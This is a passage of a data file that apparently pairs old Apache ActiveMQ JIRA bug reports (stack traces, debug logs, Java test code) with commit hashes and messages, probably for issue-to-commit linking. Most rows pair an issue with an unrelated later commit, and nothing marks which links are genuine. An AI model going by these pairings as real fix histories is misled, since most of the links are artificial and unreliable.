[                          main] DefaultJDBCAdapter             DEBUG Could not create JDBC tables; The message table already existed. Failure was: CREATE TABLE ACTIVEMQ_ACKS(CONTAINER VARCHAR(250) NOT NULL, CLIENT_ID VARCHAR(250) NOT NULL, SUB_NAME VARCHAR(250) NOT NULL, SELECTOR VARCHAR(250), LAST_ACKED_ID INTEGER, PRIMARY KEY ( CONTAINER, CLIENT_ID, SUB_NAME)) Message: Table/View 'ACTIVEMQ_ACKS' already exists in Schema 'APP'. SQLState: X0Y32 Vendor code: 20000
[                          main] JDBCPersistenceAdapter         DEBUG Cleaning up old messages.
[                          main] DefaultJDBCAdapter             DEBUG Executing SQL: DELETE FROM ACTIVEMQ_MSGS WHERE ( EXPIRATION<>0 AND EXPIRATION<?) OR ID <= ( SELECT min(ACTIVEMQ_ACKS.LAST_ACKED_ID) FROM ACTIVEMQ_ACKS WHERE ACTIVEMQ_ACKS.CONTAINER=ACTIVEMQ_MSGS.CONTAINER)
[                          main] DefaultJDBCAdapter             DEBUG Deleted 0 old message(s).
[                          main] JDBCPersistenceAdapter         DEBUG Cleanup done.
[                          main] JournalPersistenceAdapter      INFO  Journal Recovery Started from: Active Journal: using 1 x 0.001953125 Megs at: /workplace/fateev/install/activemq-4.0-SNAPSHOT/activemq-core/activemq-data/journal
[                          main] JournalPersistenceAdapter      DEBUG TRACE Entry: RECOVERED
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=53
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=97
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation overflowing into next logFile=0
[                          main] JournalPersistenceAdapter      DEBUG TRACE Entry: RECOVERED
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=53
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=97
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation overflowing into next logFile=0
[                          main] JournalPersistenceAdapter      DEBUG TRACE Entry: RECOVERED
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=53
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation offset=97
[                Journal Writer] LogFileManager                 DEBUG getNextDataRecordLocation overflowing into next logFile=0

The log entry from getNextDataRecordLocation is coming from log statement I've added to LogFileManager.getNextDataRecordLocation:

   public Location getNextDataRecordLocation(Location lastLocation) throws IOException, InvalidRecordLocationException {
        RecordInfo ri = readRecordInfo(lastLocation);
        while (true) {

            int logFileId = ri.getLocation().getLogFileId();
            int offset = ri.getNextLocation();
            log.debug(""getNextDataRecordLocation offset="" + offset);
            // Are we overflowing into next logFile?
            if (offset >= ri.getLogFileState().getAppendOffset()) {
                LogFileNode nextActive = ri.getLogFileState().getNextActive();
                log.debug(""getNextDataRecordLocation overflowing into next logFile="" + (nextActive == null ? ""null""  : String.valueOf(nextActive.getId())));
                if (nextActive == null) {
                    return null;
                }
                logFileId = nextActive.getId();
                offset = 0;
            }

            try {
                ri = readRecordInfo(new Location(logFileId, offset));
            } catch (InvalidRecordLocationException e) {
                return null;
            }

            // Is the next record the right record type?
            if (ri.getHeader().getRecordType() == DATA_RECORD_TYPE) {
                return ri.getLocation();
            }
            // No? go onto the next record.
        }
    }

It looks like recovery doesn't take into account that journaling storage file should have some end at some point. 

Similar problem happens if multiple files of bigger size are used. It happens every time one of the log files grows bigger then size specified in pFactory.setJournalLogFileSize(...) call.

",50a94cbf12f6a4b9d623b07515b9fd86c53efb13,[AMQ-7327] Use maxFrameSize to limit HTTP content length
12481708,AMQ-725,"I am using the lastest 4.0 release build of ActiveMQ and I have been trying to produce messages in a JMS client and receive the messages in a STOMP client.

What I have found is that if the JMS Client adds header properties to the message to be delivered to ActiveMQ then when I subscribe with the STOMP client I am receiving the Error listed below.  If I remove all header properties then the message is transmitted correctly.  I have also found that if I send messages with a STOMP client that has header properties then everything works correctly.

java.lang.NullPointerException
at java.util.Hashtable.put(Unknown Source)
at java.util.Hashtable.putAll(Unknown Source)
at org.apache.activemq.transport.stomp.FrameBuilder.addHeaders(FrameBuilder.java:65)
at org.apache.activemq.transport.stomp.Subscription.receive(Subscription.java:76)
at org.apache.activemq.transport.stomp.StompWireFormat.writeCommand(StompWireFormat.java:154)
at org.apache.activemq.transport.stomp.StompWireFormat.marshal(StompWireFormat.java:305)
at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:124)
at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:141)
at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)
at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:211)
at org.apache.activemq.broker.AbstractConnection.processDispatch(AbstractConnection.java:581)
at org.apache.activemq.broker.AbstractConnection.iterate(AbstractConnection.java:597)
at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:87)
at org.apache.activemq.thread.DedicatedTaskRunner.access$000(DedicatedTaskRunner.java:24)
at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:38)

",dee685f73c67a87b731135146daddedb9cc47cee,"http://issues.apache.org/activemq/browse/AMQ-725

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@414610 13f79535-47bb-0310-9956-ffa450edef68"
12482206,AMQ-724,"If Stomp client crashes (or disconnects unexpectedly) when there are unconsumed messages in the broker, the subscriptions are not removed from the broker and some phantom consumer is still consuming messages. If you connect other client, it receives only half messages (other half messages goes to that phantom consumer still left afrter client disconnect). There are no error logs in activemq logs. We are using stomp client, whith client acknowledge mode, so on broker restart, all messages are delivered properly. You can also see in jmx console, that subscription still exists whithout any connection left.",2c8b312bdab334694f4cdc9673af9aec3f170405,"excluded failing test for AMQ-724

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@413014 13f79535-47bb-0310-9956-ffa450edef68"
12482206,AMQ-724,"If Stomp client crashes (or disconnects unexpectedly) when there are unconsumed messages in the broker, the subscriptions are not removed from the broker and some phantom consumer is still consuming messages. If you connect other client, it receives only half messages (other half messages goes to that phantom consumer still left afrter client disconnect). There are no error logs in activemq logs. We are using stomp client, whith client acknowledge mode, so on broker restart, all messages are delivered properly. You can also see in jmx console, that subscription still exists whithout any connection left.",f01e35f7d95bee8c22c5eb45b8b25375fc6ece59,[AMQ-7246] Add scheduledMessageCount attribute on the JobSchedulerView MBean
12481878,AMQ-721,"Openwire client hangs after receiving 999 messages
changing Session.Prefetch postpone the  problem...

Current code is :
   public class Session : ISession
    {
       :
       :
        private int prefetchSize = 1000;

this block at message #999

changing         private int prefetchSize = 2000 ==>  blocks at message #1999
",bce979349ea9be499d1a686582e8638d369251d1,AMQ-7219 - ActiveMQ replays journal file on a clean/unclean shutdown with transacted session + Non persistent Messages
12481641,AMQ-719,The payload content for a JMS message contains initial bytes for the length of the text string.  The payload content for an dotNet openwire content does not contain this information.  This mismatch in payload results in invalid payloads when passing jms messages between technologies.,7404b43f2d9c5bbf4ab4ec89ae111d5bf1527d82,"AMQ-7193 - resolve intermittent NPE on duplex network connector start; wait for start completion before dispatching inbound messages, fix and test"
12481641,AMQ-719,The payload content for a JMS message contains initial bytes for the length of the text string.  The payload content for an dotNet openwire content does not contain this information.  This mismatch in payload results in invalid payloads when passing jms messages between technologies.,dc35218a2d766a86a78376bfd4b51e7ae5bda935,AMQ-7196 - fix broken test; recovery not applicable to inmemory store
12481765,AMQ-716,"Producer  send a message with a non transacted Session

Testing a Consumer with a non transacted Session to receive Messages  
the  Message is read but not removed.

Testing a Consumer with a  transacted Session and commit
the  Message is read and not removed.
",cd1d5eb785a759d285652551f1984ce9877a1192,"AMQ-7163 - If the broker had an unclean shutdown and number of free pages is Zero after the recovery, the next shutdown will also be 'unclean'"
12481687,AMQ-713,"investigate possible bug with LastImageRecoveryPolicy .  A unit test for this would also help. 

http://www.nabble.com/Special-Topic-Queue...-t1558344.html",5c23dd53ad3d40e80273f48ab36afda00186736e,"AMQ7135 : do a purge before deleting the destination

(cherry picked from commit 9f513f88781667df1a2a4b0a85153059dc097295)"
12481687,AMQ-713,"investigate possible bug with LastImageRecoveryPolicy .  A unit test for this would also help. 

http://www.nabble.com/Special-Topic-Queue...-t1558344.html",ae357564b4e045fa4b05f925e4d8c1be5a8fe91c,AMQ-7132 - user periodic fsync in RecoveryStatsBrokerTest to improve performance
12481563,AMQ-712,"investigate possible bug on byte selector.   A test case would be helpful

http://www.nabble.com/Byte-selector-does-not-work-t1637922.html

",b10458e2c69aa8743e6606948a13dcf27dca1ccc,AMQ-7125 Broker does not send error frame when an empty destination is sent with a stomp subscribe frame
12481563,AMQ-712,"investigate possible bug on byte selector.   A test case would be helpful

http://www.nabble.com/Byte-selector-does-not-work-t1637922.html

",88525ce650e0843b555b1ef45834435ef719d2f6,[AMQ-7121] Set setter accessible (for JDK 11)
12481696,AMQ-708,"Hostname and port changes I made to the activemq connectors via the geronimo admin console don't get persisted in geronimo's var/config/config.xml, causing them to revert to their original values when the server restarts.

To fix this problem ActiveMQConnectorGBean needs to declare the host and port attributes as manageable when it creates its gbeaninfo. See the attached patch.",daea192eefe683a8cba63b5136dc8c2b39722cfe,"AMQ-7085 - Properly start TempUsage inside Queue start

This fix allows temp usage changes to the broker temp usage to propagate
properly to a Queue's temp usage settings

Patch applied with thanks to David Sitsky"
12481667,AMQ-706,"The argument following ""-jar"" in activemq.bat is not quoted.  If %ACTIVEMQ_HOME% contains
spaces, startup will fail with an error like:

  Unable to access jarfile C:\Program

I haven't tested, but the same bug may apply to the other batch files and the unix shell scripts.

Attached is a trival patch to add the quotes to activemq.bat.

--Brad
",8e5d539665519629139633e324a672b0a415d4b2,AMQ-7067 - add missing license header
12481682,AMQ-705,"Found problem when using Geronimo with an incorrectly configured EJB 2.0 MDB that has:

         <message-driven-destination>
            <destination-type>javax.jms.Queue</destination-type>
            <subscription-durability>Durable</subscription-durability>
         </message-driven-destination>

The above config doesn't make sense since subscription-durability is only applicable for Topics.

This resulted in a message that didn't directly point to the problem:

C:\test>java  -jar geronimo-1.1-SNAPSHOT\bin\deployer.jar --user system --password manager deploy my.ear myplan.xml
    Error: Unable to distribute my.ear: JMS settings for
    message-driven bean FooMDBean are not valid:
    Invalid settings: clientId must be set since durable subscription  was requested. subscriptionName must be set since durable     subscription was requested. 

With the patch applied, the error will now be:

C:\test>java  -jar geronimo-1.1-SNAPSHOT\bin\deployer.jar --user system --password manager deploy my.ear wmyplan.xml
    Error: Unable to distribute my.ear: JMS settings for
    message-driven bean FooMDBean are not valid:
    Invalid settings: subscriptionDurability cannot be set to: Durable  when destinationType is set to javax.jms.Queue as it is only valid when destinationType is set to javax.jms.Topic. clientId must be set since durable subscription was requested. subscriptionName must be set since durable subscription was requested.

",3fc05469369e4e7296197690d847041762a06f6a,"Applied John Sission's patch: https://issues.apache.org/activemq/browse/AMQ-705 Thanks John!

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@399701 13f79535-47bb-0310-9956-ffa450edef68"
12481682,AMQ-705,"Found problem when using Geronimo with an incorrectly configured EJB 2.0 MDB that has:

         <message-driven-destination>
            <destination-type>javax.jms.Queue</destination-type>
            <subscription-durability>Durable</subscription-durability>
         </message-driven-destination>

The above config doesn't make sense since subscription-durability is only applicable for Topics.

This resulted in a message that didn't directly point to the problem:

C:\test>java  -jar geronimo-1.1-SNAPSHOT\bin\deployer.jar --user system --password manager deploy my.ear myplan.xml
    Error: Unable to distribute my.ear: JMS settings for
    message-driven bean FooMDBean are not valid:
    Invalid settings: clientId must be set since durable subscription  was requested. subscriptionName must be set since durable     subscription was requested. 

With the patch applied, the error will now be:

C:\test>java  -jar geronimo-1.1-SNAPSHOT\bin\deployer.jar --user system --password manager deploy my.ear wmyplan.xml
    Error: Unable to distribute my.ear: JMS settings for
    message-driven bean FooMDBean are not valid:
    Invalid settings: subscriptionDurability cannot be set to: Durable  when destinationType is set to javax.jms.Queue as it is only valid when destinationType is set to javax.jms.Topic. clientId must be set since durable subscription was requested. subscriptionName must be set since durable subscription was requested.

",8f88dcda09760df3aba3306f49a3311fb22a654f,"AMQ-7055 - Optimization on SequenceSet to prevent iterating through the whole set when a value bigger than the last value is added

Signed-off-by: gtully <gary.tully@gmail.com>"
12481745,AMQ-696,"While using the new Spring-2.0 DefaultMessageListenerContainer I can reliably reproduce the following exception on the broker side which usually results in a hang on the client side:
 
The broker logs the following exception:
 
INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: ID:inspiron-1410-114619274
7453-2:1 already connected
javax.jms.InvalidClientIDException: Broker: localhost - Client: ID:inspiron-1410-1146192747453-2:1 already connected
        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:154)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:65)
        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:69)
        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:65)
        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:77)
        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:500)
        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)
        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:93)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:139)
        at java.lang.Thread.run(Thread.java:595)
 
I have extrapolated the sequence of calls that DefaultMessageListenerContainer is making and managed to produce a simple test case that reproduces the problem:
 
import junit.framework.TestCase;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ActiveMQQueue;
 
import javax.jms.*;
 
public class TestActiveMQ extends TestCase {
 
    public void testConnectionFactory() throws Exception {
        final ActiveMQConnectionFactory cf = new ActiveMQConnectionFactory(""tcp://localhost:61616"");
        final ActiveMQQueue queue = new ActiveMQQueue(""testqueue"");
        final Connection conn = cf.createConnection();
 
        Runnable r = new Runnable() {
            public void run() {
                try {
                    Session session = conn.createSession(false, 1);
                    MessageConsumer consumer = session.createConsumer(queue, null);
                    Message msg = consumer.receive(1000);
                } catch (JMSException e) {
                    e.printStackTrace();
                }
            }
        };
        new Thread(r).start();
        conn.start();
 
        try {
            synchronized (this) {
                wait(3000);
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
 
Let us know if you need anymore information. Dont want to scrub ActiveMQ from my list of candidates If I can help it.
 
cheers
craig
 

",6b1682f9490731b47e943cd32864f8627977a01a,"added test case for AMQ-696

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@398560 13f79535-47bb-0310-9956-ffa450edef68"
12481598,AMQ-691,"Reported at:

http://www.nabble.com/publish%28%29-call-to-remote-JMS-server-hangs-t1446830.html#a3970530",9cf5f45cf67ca968bf634362891aa8012e6e107c,"If we get an async exception, report it to all blocked sync requests.
https://issues.apache.org/activemq/browse/AMQ-691


git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@395641 13f79535-47bb-0310-9956-ffa450edef68"
12481637,AMQ-689,"I have redelivery configured, but when it fails in all attempts (through a RuntimeException), I get the following message:

11:00:54,775 DEBUG [ServerSessionImpl:0] Endpoint failed to process message.
java.lang.NullPointerException
	at org.apache.activemq.ra.ServerSessionImpl.afterDelivery(ServerSessionImpl.java:218)
	at org.apache.activemq.ActiveMQSession.run(ActiveMQSession.java:723)
	at org.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:163)
	at org.apache.geronimo.connector.work.WorkerContext.run(WorkerContext.java:291)
	at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
	at java.lang.Thread.run(Unknown Source)
11:00:54,775 INFO  [ServerSessionImpl:0] Endpoint failed to process message. Reason: java.lang.NullPointerException
11:00:54,775 DEBUG [ServerSessionImpl:0] run loop end
11:00:54,775 DEBUG [ServerSessionImpl:0] Endpoint did not release properly: org.apache.activemq.ra.InvalidMessageEndpointException
org.apache.activemq.ra.InvalidMessageEndpointException
	at org.apache.activemq.ra.MessageEndpointProxy$MessageEndpointDead.release(MessageEndpointProxy.java:156)
	at org.apache.activemq.ra.MessageEndpointProxy.release(MessageEndpointProxy.java:68)
	at org.apache.activemq.ra.ServerSessionImpl.close(ServerSessionImpl.java:250)
	at org.apache.activemq.ra.ServerSessionPoolImpl.removeFromPool(ServerSessionPoolImpl.java:180)
	at org.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:177)
	at org.apache.geronimo.connector.work.WorkerContext.run(WorkerContext.java:291)
	at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(Unknown Source)
	at java.lang.Thread.run(Unknown Source)
11:00:54,775 DEBUG [ServerSessionImpl:0] Run finished
11:00:54,775 DEBUG [ServerSessionImpl:0] Work completed: javax.resource.spi.work.WorkEvent[source=Work :ServerSessionImpl:0]
11:00:54,790 DEBUG [ServerSessionPoolImpl] ServerSession requested.

The code that throws this NPE is ServerSessionImpl, whose excerpt I send below. There are more reports of this 

            try {
                endpoint.afterDelivery();
            } catch (Throwable e) {
                throw new RuntimeException(""Endpoint after delivery notification failure"", e);
            } finally {
                if( session.getTransactionContext().isInLocalTransaction() ) { <<<<--------------------------- NPE
                    if( !useRAManagedTx ) {
                        // Sanitiy Check: If the local transaction has not been commited..
                        // Commit it now.
                        log.warn(""Local transaction had not been commited.  Commiting now."");
                    }
                    try {
                        session.commit();
                    } catch (JMSException e) {
                        log.info(""Commit failed:"", e);
                    }
                }
            }",f96a20e831755505b31df2e14fd3266f74d5a149,[AMQ-6891] apply fix and test from Radek Kraus with thanks. Pending cursor adds are now dropped on rollback
12481540,AMQ-683,A memory leak in the ManagedRegionBroker - not critical because the work around currently is to set the property on the broker useJmx=false,a1e87c60963d7ac736aad01786dc6026fe2c3ac3,[AMQ-6833] Cleanly close DirContext in LDAPLoginModule when the authentication is complete
12482024,AMQ-680,"After creating a new destination, rapid multithreaded MessageProducer.send's cause JMX registration conflict.  Two or more MessageProducers attempt to register the newly created destination with JMX, hence raising the InstanceAlreadyExistsException.

16:05:57,609 ERROR [ManagedRegionBroker] Failed to register destination topic://
clientRecordQuery-1144357557593-41
javax.management.InstanceAlreadyExistsException: org.apache.activemq:BrokerName=
localhost,Type=Topic,Destination=clientRecordQuery-1144357557593-41 already regi
stered.",c691124d3288ffc9299bedca69b952952f2cbcf6,AMQ-6808 preserve destination for browsed scheduled messages
12481396,AMQ-679,"If start broker  i get this message:

WARNING: Database driver NOT recognized: 
[ibm_db2_jdbc_universal_driver_architecture].  Will use default JDBC 
implementation.

But this seems to be o.k. so far, because after starting the broker, two new 
tables (activemq_msgs/acks) get created. 

Testing a Consumer to receive Messages
the broker throws this exception:

2006-04-05 17:13:03,304 [.168.1.52:52134] 
INFO  Service                        - Sync error occurred: java.io.IOException: Non-atomic batch failure.  The batch was submitted, but at least one exception occurred on an individual member of the batch. Use getNextException() to retrieve the exceptions for specific batched elements.
java.io.IOException: Non-atomic batch failure.  The batch was submitted, but at least one exception occurred on an individual member of the batch. Use getNextException() to retrieve the exceptions for specific batched elements.
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:42)
	at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionContext.java:125)
	at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:73)
	at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:223)
	at org.apache.activemq.store.memory.MemoryTransactionStore$1.addMessage(MemoryTransactionStore.java:116)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:246)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:196)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:307)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:108)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:120)
	at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:346)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:590)
	at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:88)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
	at java.lang.Thread.run(Thread.java:570)",63f0b7e20d56837b4f159e83594a4e4fb906cd4a,[AMQ-6792] fire the failover exception handler before stop to ensure blocked write does not block stop request
12481396,AMQ-679,"If start broker  i get this message:

WARNING: Database driver NOT recognized: 
[ibm_db2_jdbc_universal_driver_architecture].  Will use default JDBC 
implementation.

But this seems to be o.k. so far, because after starting the broker, two new 
tables (activemq_msgs/acks) get created. 

Testing a Consumer to receive Messages
the broker throws this exception:

2006-04-05 17:13:03,304 [.168.1.52:52134] 
INFO  Service                        - Sync error occurred: java.io.IOException: Non-atomic batch failure.  The batch was submitted, but at least one exception occurred on an individual member of the batch. Use getNextException() to retrieve the exceptions for specific batched elements.
java.io.IOException: Non-atomic batch failure.  The batch was submitted, but at least one exception occurred on an individual member of the batch. Use getNextException() to retrieve the exceptions for specific batched elements.
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:42)
	at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionContext.java:125)
	at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:73)
	at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:223)
	at org.apache.activemq.store.memory.MemoryTransactionStore$1.addMessage(MemoryTransactionStore.java:116)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:246)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:196)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:307)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:108)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:120)
	at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:346)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:590)
	at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:88)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
	at java.lang.Thread.run(Thread.java:570)",35bd3ad938f5c378b17a34980d2f3480bf3bbfc3,"AMQ-6798 - Clean up store usage object on Queue stop

When queues are stopped the StoreUsage object needs to be stopped so it
will be removed from the parent StoreUsage.  This allows the object to
be garbage collected and prevents a memory leak."
12481396,AMQ-679,"If start broker  i get this message:

WARNING: Database driver NOT recognized: 
[ibm_db2_jdbc_universal_driver_architecture].  Will use default JDBC 
implementation.

But this seems to be o.k. so far, because after starting the broker, two new 
tables (activemq_msgs/acks) get created. 

Testing a Consumer to receive Messages
the broker throws this exception:

2006-04-05 17:13:03,304 [.168.1.52:52134] 
INFO  Service                        - Sync error occurred: java.io.IOException: Non-atomic batch failure.  The batch was submitted, but at least one exception occurred on an individual member of the batch. Use getNextException() to retrieve the exceptions for specific batched elements.
java.io.IOException: Non-atomic batch failure.  The batch was submitted, but at least one exception occurred on an individual member of the batch. Use getNextException() to retrieve the exceptions for specific batched elements.
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:42)
	at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionContext.java:125)
	at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:73)
	at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:223)
	at org.apache.activemq.store.memory.MemoryTransactionStore$1.addMessage(MemoryTransactionStore.java:116)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:246)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:196)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:307)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:108)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:120)
	at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:346)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:590)
	at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:88)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
	at java.lang.Thread.run(Thread.java:570)",33b52b5914b30e73663a344f095a30c1dd484f49,[AMQ-6790] add netty kqueue osgi dependency to the activemq-amqp-client feature
12481396,AMQ-679,"If start broker  i get this message:

WARNING: Database driver NOT recognized: 
[ibm_db2_jdbc_universal_driver_architecture].  Will use default JDBC 
implementation.

But this seems to be o.k. so far, because after starting the broker, two new 
tables (activemq_msgs/acks) get created. 

Testing a Consumer to receive Messages
the broker throws this exception:

2006-04-05 17:13:03,304 [.168.1.52:52134] 
INFO  Service                        - Sync error occurred: java.io.IOException: Non-atomic batch failure.  The batch was submitted, but at least one exception occurred on an individual member of the batch. Use getNextException() to retrieve the exceptions for specific batched elements.
java.io.IOException: Non-atomic batch failure.  The batch was submitted, but at least one exception occurred on an individual member of the batch. Use getNextException() to retrieve the exceptions for specific batched elements.
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:42)
	at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionContext.java:125)
	at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:73)
	at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:223)
	at org.apache.activemq.store.memory.MemoryTransactionStore$1.addMessage(MemoryTransactionStore.java:116)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:246)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:196)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:307)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:108)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:120)
	at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:346)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:590)
	at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:196)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:62)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:88)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:70)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:114)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:122)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:87)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)
